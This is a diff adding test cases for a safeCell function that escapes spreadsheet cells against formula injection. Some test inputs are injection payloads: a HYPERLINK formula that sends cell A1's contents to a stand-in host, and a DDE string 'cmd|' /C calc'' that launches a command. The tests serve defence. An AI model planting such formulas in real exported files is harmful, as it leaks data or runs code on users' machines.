@@ -58,6 +58,10 @@ describe('cells of typed text, for a file opened in a spreadsheet (#221)', () =>
 		expect(safeCell('-cmd')).toBe("'-cmd");
 		expect(safeCell('=HYPERLINK("http://x/?"&A1,"x")')).toBe(`"'=HYPERLINK(""http://x/?""&A1,""x"")"`);
 		expect(safeCell('-0.5')).toBe('-0.5');
+		expect(safeCell('-1,234.5')).toBe('"-1,234.5"');
+		expect(safeCell('-1+HYPERLINK("http://x/?"&A1,"x")')).toBe(`"'-1+HYPERLINK(""http://x/?""&A1,""x"")"`);
+		expect(safeCell("-1+cmd|' /C calc'!A0")).toBe("'-1+cmd|' /C calc'!A0");
+		expect(safeCell('-2 fish lost')).toBe("'-2 fish lost");
 		expect(safeCell('7.2')).toBe('7.2');
 		expect(safeCell('Before the water change')).toBe('Before the water change');
 		expect(safeCell('')).toBe('');
